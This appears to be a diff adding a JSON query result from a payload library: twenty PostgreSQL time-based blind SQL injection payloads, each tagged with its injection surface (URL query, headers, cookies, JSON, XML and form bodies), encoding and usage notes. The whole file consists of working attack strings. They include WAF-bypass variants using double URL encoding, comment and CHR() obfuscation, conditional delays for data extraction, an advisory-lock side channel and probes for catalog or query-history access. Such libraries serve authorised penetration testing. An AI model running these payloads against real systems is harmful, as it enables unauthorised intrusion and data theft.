@@ -1,0 +1,402 @@
+{
+  "query": {
+    "db_engine": "postgres",
+    "limit": 20,
+    "max_risk": 3,
+    "technique": "blind_time",
+    "vuln_type": "sqli"
+  },
+  "count": 20,
+  "results": [
+    {
+      "id": "080ed7f2aea33387",
+      "payload": "\" AND (SELECT pg_sleep(SLEEP_SECONDS))--",
+      "technique": "blind_time",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "string_boundary": "double_quote",
+      "evidence_type": "timing",
+      "risk": 2,
+      "placeholders": [
+        "SLEEP_SECONDS"
+      ],
+      "notes": "Double-quote context time-based blind. Use when injection is inside a PG identifier (table/column alias).",
+      "source": "ensphere",
+      "tags": [
+        "double_quote",
+        "pg_sleep"
+      ]
+    },
+    {
+      "id": "2ae5435acd7b190f",
+      "payload": "' AND (SELECT pg_sleep(SLEEP_SECONDS))--",
+      "technique": "blind_time",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "string_boundary": "single_quote",
+      "evidence_type": "timing",
+      "risk": 2,
+      "placeholders": [
+        "SLEEP_SECONDS"
+      ],
+      "notes": "Basic time-based blind. Inject in string context. Observe response delay vs baseline.",
+      "source": "ensphere",
+      "tags": [
+        "confirmation",
+        "pg_sleep"
+      ]
+    },
+    {
+      "id": "2f0f4ac820672691",
+      "payload": "%2527%2520AND%2520(SELECT%2520pg_sleep(SLEEP_SECONDS))--",
+      "technique": "blind_time",
+      "injection_surface": "query",
+      "encoding": "double_url",
+      "string_boundary": "single_quote",
+      "evidence_type": "timing",
+      "risk": 2,
+      "placeholders": [
+        "SLEEP_SECONDS"
+      ],
+      "notes": "Double URL-encoded time-based blind. Bypasses WAFs that only single-decode before inspection.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "double_url_encoded",
+        "pg_sleep"
+      ]
+    },
+    {
+      "id": "3aebb2d1c22b02b9",
+      "payload": "' AND (SELECT pg_sleep(SLEEP_SECONDS))--",
+      "technique": "blind_time",
+      "injection_surface": "xml_body",
+      "encoding": "raw",
+      "string_boundary": "single_quote",
+      "evidence_type": "timing",
+      "risk": 2,
+      "placeholders": [
+        "SLEEP_SECONDS"
+      ],
+      "notes": "Time-based blind via XML body. For SOAP/XML-RPC endpoints that parse XML element values into SQL.",
+      "source": "ensphere",
+      "tags": [
+        "pg_sleep",
+        "xml_body"
+      ]
+    },
+    {
+      "id": "4965c17aaaeffd9e",
+      "payload": "\" AND (SELECT pg_sleep(SLEEP_SECONDS))--",
+      "technique": "blind_time",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "string_boundary": "double_quote",
+      "evidence_type": "timing",
+      "risk": 2,
+      "placeholders": [
+        "SLEEP_SECONDS"
+      ],
+      "notes": "Double-quote blind_time in JSON body context. For APIs that interpolate JSON values into identifier positions.",
+      "source": "ensphere",
+      "tags": [
+        "double_quote",
+        "json",
+        "pg_sleep"
+      ]
+    },
+    {
+      "id": "4d118c7e16950b15",
+      "payload": "' AND (SELECT pg_sleep(SLEEP_SECONDS))--",
+      "technique": "blind_time",
+      "injection_surface": "header",
+      "encoding": "raw",
+      "string_boundary": "single_quote",
+      "evidence_type": "timing",
+      "risk": 2,
+      "placeholders": [
+        "SLEEP_SECONDS"
+      ],
+      "notes": "Time-based blind via HTTP header (User-Agent, Referer, X-Forwarded-For). Many logging pipelines insert headers unsanitized.",
+      "source": "ensphere",
+      "tags": [
+        "header",
+        "pg_sleep"
+      ]
+    },
+    {
+      "id": "6b8846f86ee9f230",
+      "payload": "%27%20AND%20(SELECT%20pg_sleep(SLEEP_SECONDS))--",
+      "technique": "blind_time",
+      "injection_surface": "query",
+      "encoding": "url",
+      "string_boundary": "single_quote",
+      "evidence_type": "timing",
+      "risk": 2,
+      "placeholders": [
+        "SLEEP_SECONDS"
+      ],
+      "notes": "URL-encoded time-based blind. For targets where WAF inspects pre-decode but SQL engine sees decoded.",
+      "source": "ensphere",
+      "tags": [
+        "pg_sleep",
+        "url_encoded"
+      ]
+    },
+    {
+      "id": "79462d1f0089fd7f",
+      "payload": "' AND (SELECT pg_sleep(SLEEP_SECONDS))--",
+      "technique": "blind_time",
+      "injection_surface": "form_body",
+      "encoding": "raw",
+      "string_boundary": "single_quote",
+      "evidence_type": "timing",
+      "risk": 2,
+      "placeholders": [
+        "SLEEP_SECONDS"
+      ],
+      "notes": "Time-based blind via form POST body. Standard injection surface for form-based apps.",
+      "source": "ensphere",
+      "tags": [
+        "form",
+        "pg_sleep"
+      ]
+    },
+    {
+      "id": "9bcd6817abc0f407",
+      "payload": "1; SELECT pg_sleep(SLEEP_SECONDS)--",
+      "technique": "blind_time",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "string_boundary": "numeric",
+      "evidence_type": "timing",
+      "risk": 2,
+      "placeholders": [
+        "SLEEP_SECONDS"
+      ],
+      "notes": "Numeric context time-based blind via stacked query. Use when injection point is in an integer parameter.",
+      "source": "ensphere",
+      "tags": [
+        "numeric",
+        "pg_sleep",
+        "stacked"
+      ]
+    },
+    {
+      "id": "a0e42753f69a664a",
+      "payload": "' AND (SELECT pg_sleep(SLEEP_SECONDS))--",
+      "technique": "blind_time",
+      "injection_surface": "cookie",
+      "encoding": "raw",
+      "string_boundary": "single_quote",
+      "evidence_type": "timing",
+      "risk": 2,
+      "placeholders": [
+        "SLEEP_SECONDS"
+      ],
+      "notes": "Time-based blind via cookie value. Target apps that store or query session data from cookies.",
+      "source": "ensphere",
+      "tags": [
+        "cookie",
+        "pg_sleep"
+      ]
+    },
+    {
+      "id": "b39697c264bcf9d1",
+      "payload": "'/**/AND/**/(SELECT/**/pg_sleep(SLEEP_SECONDS))--",
+      "technique": "blind_time",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "string_boundary": "single_quote",
+      "evidence_type": "timing",
+      "risk": 2,
+      "placeholders": [
+        "SLEEP_SECONDS"
+      ],
+      "notes": "Comment obfuscation with /**/. Bypasses WAF rules that match on whitespace between SQL keywords.",
+      "source": "ensphere",
+      "tags": [
+        "comment",
+        "obfuscation",
+        "pg_sleep"
+      ]
+    },
+    {
+      "id": "c7d24e7e024e5755",
+      "payload": "' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(SLEEP_SECONDS) ELSE pg_sleep(0) END)--",
+      "technique": "blind_time",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "string_boundary": "single_quote",
+      "evidence_type": "timing",
+      "risk": 2,
+      "placeholders": [
+        "SLEEP_SECONDS"
+      ],
+      "notes": "Conditional time delay. Change 1=1 to actual boolean condition for data extraction.",
+      "source": "ensphere",
+      "tags": [
+        "conditional",
+        "extraction",
+        "pg_sleep"
+      ]
+    },
+    {
+      "id": "c9bedbfdf8cb8c72",
+      "payload": "\\u0027 AND (SELECT pg_sleep(SLEEP_SECONDS))--",
+      "technique": "blind_time",
+      "injection_surface": "query",
+      "encoding": "unicode",
+      "string_boundary": "single_quote",
+      "evidence_type": "timing",
+      "risk": 2,
+      "placeholders": [
+        "SLEEP_SECONDS"
+      ],
+      "notes": "Unicode-encoded quote (\\u0027). Tests frameworks that normalize Unicode before SQL construction.",
+      "source": "ensphere",
+      "tags": [
+        "pg_sleep",
+        "unicode"
+      ]
+    },
+    {
+      "id": "d1e74b3dcec0c52d",
+      "payload": "'--\nAND (SELECT pg_sleep(SLEEP_SECONDS))--",
+      "technique": "blind_time",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "string_boundary": "single_quote",
+      "evidence_type": "timing",
+      "risk": 2,
+      "placeholders": [
+        "SLEEP_SECONDS"
+      ],
+      "notes": "Newline after single-line comment (--). The -- comments out the rest of line 1; line 2 continues the query. Bypasses single-line pattern matching.",
+      "source": "ensphere",
+      "tags": [
+        "newline_comment",
+        "obfuscation",
+        "pg_sleep"
+      ]
+    },
+    {
+      "id": "e909c6b43411a19c",
+      "payload": "' AND (SELECT pg_sleep(SLEEP_SECONDS))--",
+      "technique": "blind_time",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "string_boundary": "single_quote",
+      "evidence_type": "timing",
+      "risk": 2,
+      "placeholders": [
+        "SLEEP_SECONDS"
+      ],
+      "notes": "Time-based blind injected via JSON body field. Check if app deserializes JSON values into SQL.",
+      "source": "ensphere",
+      "tags": [
+        "json",
+        "pg_sleep"
+      ]
+    },
+    {
+      "id": "3a648389174355c6",
+      "payload": "' AND (SELECT CASE WHEN (SELECT LENGTH(current_user))\u003eTHRESHOLD THEN pg_advisory_lock(1) ELSE pg_advisory_lock(2) END) IS NOT NULL--",
+      "technique": "blind_time",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "string_boundary": "single_quote",
+      "evidence_type": "timing",
+      "risk": 3,
+      "placeholders": [
+        "THRESHOLD"
+      ],
+      "notes": "Advisory lock side-channel. Different lock IDs taken depending on condition. Detectable via pg_locks inspection in a parallel connection or via timing of lock contention.",
+      "source": "ensphere",
+      "tags": [
+        "advisory_lock",
+        "extraction",
+        "side_channel"
+      ]
+    },
+    {
+      "id": "42ca15646d997a3c",
+      "payload": "' AND (SELECT pg_sleep(SLEEP_SECONDS) WHERE CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110)=(SELECT SUBSTR(current_user,1,5)))--",
+      "technique": "blind_time",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "string_boundary": "single_quote",
+      "evidence_type": "timing",
+      "risk": 3,
+      "placeholders": [
+        "SLEEP_SECONDS"
+      ],
+      "notes": "CHR() obfuscation for string comparison. Compares current_user prefix to 'admin' built from CHR() calls. Bypasses keyword-based WAFs.",
+      "source": "ensphere",
+      "tags": [
+        "chr_obfuscation",
+        "pg_sleep",
+        "waf_bypass"
+      ]
+    },
+    {
+      "id": "68ed34c639fe7d50",
+      "payload": "' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM pg_stat_statements)\u003e0 THEN pg_sleep(SLEEP_SECONDS) ELSE pg_sleep(0) END)--",
+      "technique": "blind_time",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "string_boundary": "single_quote",
+      "evidence_type": "timing",
+      "risk": 3,
+      "placeholders": [
+        "SLEEP_SECONDS"
+      ],
+      "notes": "Probes whether pg_stat_statements extension is enabled. If it fires, query history exfiltration is possible.",
+      "source": "ensphere",
+      "tags": [
+        "pg_sleep",
+        "pg_stat_statements",
+        "recon"
+      ]
+    },
+    {
+      "id": "788c88bbec054c3f",
+      "payload": "' AND (SELECT pg_sleep(SLEEP_SECONDS) FROM pg_catalog.pg_user LIMIT 1)--",
+      "technique": "blind_time",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "string_boundary": "single_quote",
+      "evidence_type": "timing",
+      "risk": 3,
+      "placeholders": [
+        "SLEEP_SECONDS"
+      ],
+      "notes": "Advisory side-channel: delays only if pg_user table is accessible. Confirms catalog read access without data extraction.",
+      "source": "ensphere",
+      "tags": [
+        "advisory",
+        "pg_sleep",
+        "privilege_check"
+      ]
+    },
+    {
+      "id": "80e6d6e4f9af3db1",
+      "payload": "'; SELECT pg_sleep(SLEEP_SECONDS)--",
+      "technique": "blind_time",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "string_boundary": "single_quote",
+      "evidence_type": "timing",
+      "risk": 3,
+      "placeholders": [
+        "SLEEP_SECONDS"
+      ],
+      "notes": "Stacked query time-based blind. Postgres supports stacked queries natively via libpq. Confirms stacked execution.",
+      "source": "ensphere",
+      "tags": [
+        "pg_sleep",
+        "stacked"
+      ]
+    }
+  ]
+}
